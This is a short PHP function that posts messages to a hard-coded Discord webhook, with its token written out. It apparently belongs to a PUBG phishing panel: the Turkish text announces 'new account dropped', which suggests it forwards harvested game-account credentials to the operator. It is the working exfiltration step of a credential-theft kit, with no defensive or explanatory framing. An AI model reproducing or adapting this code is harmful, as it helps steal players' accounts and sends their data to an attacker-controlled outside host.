function sendToDiscord($mesaj) {
    $webhookurl = "https://discord.com/api/webhooks/1452751466816344106/yan3aGqAd-Pf8gu3LkCqEMinDu_N6KvOB5DpWVrvInVFV5DVZtUcgBUjNHImBcE_XO-G"; 

    $json_data = json_encode([
        "content" => "🚀 **Yeni Hesap Düştü!**",
        "embeds" => [
            [
                "title" => "PUBG Panel Bildirimi",
                "description" => $mesaj,
                "color" => hexdec("ff0000"), // Kırmızı renk
                "footer" => ["text" => "Zaman: " . date('d-m-Y H:i:s')]
            ]
        ]
    ]);

    $ch = curl_init($webhookurl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
}